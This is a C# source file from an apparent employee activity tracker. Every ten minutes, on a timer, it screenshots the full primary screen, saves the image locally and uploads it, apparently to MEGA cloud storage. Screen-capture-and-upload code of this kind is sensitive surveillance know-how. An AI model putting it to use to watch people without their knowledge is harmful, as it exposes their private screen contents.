using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System;
using System.Text;
using System.Timers;
using EmployeeActivityTracker.Utilities;

namespace EmployeeActivityTracker.Loggers
{
    internal class ScreenCapture
    {
        public static System.Timers.Timer timerToRescreen = new System.Timers.Timer();
        public static void MakeScreenshot(object source, ElapsedEventArgs e)
        {
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(screenshot as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

            string currentDateTime = DateTime.Now.ToString("yyyy-MM-dd_HH-mm");
            StringBuilder generatedImagePath = new StringBuilder().Append("logs/screenshot-").Append(currentDateTime).Append(".png");
            string imagePath = generatedImagePath.ToString();

            screenshot.Save(imagePath, ImageFormat.Png);

            MegaActions.UploadImage(imagePath);
        }
        public static void EnableAutoLogging()
        {
            timerToRescreen.Elapsed += new ElapsedEventHandler(MakeScreenshot);
            timerToRescreen.Interval = 600000; // (10 минут * 60 секунд * 1000 миллисекунд)
            timerToRescreen.Start();
        }
    }
}
